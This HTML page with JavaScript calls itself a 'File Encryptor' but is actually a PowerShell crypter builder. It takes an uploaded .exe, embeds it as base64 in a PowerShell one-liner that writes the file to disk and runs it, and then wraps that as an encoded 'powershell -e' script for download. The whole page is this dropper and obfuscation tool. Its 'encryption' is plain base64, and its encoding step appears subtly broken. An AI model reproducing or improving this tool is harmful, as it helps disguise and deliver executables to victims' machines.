<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Encryptor</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
        h1 { margin-bottom: 20px; font-size: 2.5rem; }
        .container { display: flex; flex-direction: row; justify-content: space-around; width: 100%; max-width: 800px; padding: 20px; border-radius: 15px; background-color: rgba(0, 0, 0, 0.7); box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); }
        .box { background-color: rgba(255, 255, 255, 0.1); border-radius: 10px; padding: 20px; margin: 10px; width: 45%; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); }
        button { padding: 15px 20px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; margin: 10px 0; background-color: #ff4757; color: white; transition: background-color 0.3s, transform 0.2s; width: 100%; }
        button:hover { background-color: #ff6b81; transform: scale(1.05); }
        input[type="file"] { display: none; }
        label { background-color: #3742fa; padding: 15px; border-radius: 5px; color: white; cursor: pointer; display: inline-block; margin: 10px 0; transition: background-color 0.3s; }
        label:hover { background-color: #5f27cd; }
        #ps-output { border: 1px solid white; padding: 10px; display: inline-block; width: 100%; word-wrap: break-word; color: #ffeb3b; margin-top: 10px; }
        .toggle { display: flex; align-items: center; margin: 10px 0; }
        .toggle input { margin-right: 10px; }
    </style>
</head>
<body>

    <h1>File Encryptor</h1>
    <div class="container">
        <div class="box" id="file-selection-box">
            <h2>Choose the File</h2>
            <label id="choose-file-button" for="file-input">Choose File</label>
            <input type="file" id="file-input" accept=".exe" />
            <div id="file-name">No file chosen</div>
        </div>

        <div class="box" id="ps1-generation-box">
            <h2>PS1 Generation</h2>
            <button id="generate-ps-button" onclick="generatePSScript()">Generate PS1 Code</button>
            <div id="ps-output">PowerShell Code: Click to Generate</div>
            <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
            <button id="crypt-button" onclick="createCrypter()">PowerShell Crypter</button>
        </div>
    </div>

    <div class="box" id="feature-toggle-box">
        <h2>Feature Toggles</h2>
        <div class="toggle"><input type="checkbox" id="feature1"> <label for="feature1">Feature 1</label></div>
        <div class="toggle"><input type="checkbox" id="feature2"> <label for="feature2">Feature 2</label></div>
        <div class="toggle"><input type="checkbox" id="feature3"> <label for="feature3">Feature 3</label></div>
        <div class="toggle"><input type="checkbox" id="feature4"> <label for="feature4">Feature 4</label></div>
        <div class="toggle"><input type="checkbox" id="feature5"> <label for="feature5">Feature 5</label></div>
        <div class="toggle"><input type="checkbox" id="feature6"> <label for="feature6">Feature 6</label></div>
        <div class="toggle"><input type="checkbox" id="feature7"> <label for="feature7">Feature 7</label></div>
        <div class="toggle"><input type="checkbox" id="feature8"> <label for="feature8">Feature 8</label></div>
        <div class="toggle"><input type="checkbox" id="feature9"> <label for="feature9">Feature 9</label></div>
        <div class="toggle"><input type="checkbox" id="feature10"> <label for="feature10">Feature 10</label></div>
    </div>

    <script>
        let selectedFile;
        let finalPSCode = '';

        document.getElementById("file-input").addEventListener("change", function() {
            const fileNameDisplay = document.getElementById("file-name");
            if (this.files.length > 0) {
                selectedFile = this.files[0];
                fileNameDisplay.textContent = selectedFile.name;
            } else {
                fileNameDisplay.textContent = "No file chosen";
            }
        });

        function generatePSScript() {
            if (!selectedFile) {
                alert("Please choose a file first.");
                return;
            }

            const reader = new FileReader();
            reader.onload = function(event) {
                const base64String = event.target.result.split(',')[1];
                finalPSCode = `
                $b="${base64String}";[IO.File]::WriteAllBytes("executable.exe",[Convert]::FromBase64String($b));Start-Process "executable.exe";
                `;
                document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
            };

            reader.readAsDataURL(selectedFile);
        }

        function copyPSScript() {
            navigator.clipboard.writeText(finalPSCode).then(() => {
                alert("PowerShell script copied to clipboard!");
            }).catch(err => {
                console.error('Error copying to clipboard: ', err);
            });
        }

        function createCrypter() {
            if (!finalPSCode) {
                alert("Please generate PowerShell code first.");
                return;
            }

            const encodedCode = btoa(finalPSCode);
            const psFileContent = `powershell -e '${encodedCode}'`;

            const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'encrypted_script.ps1';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            alert("Encrypted PowerShell script downloaded!");
        }
    </script>

</body>
</html>
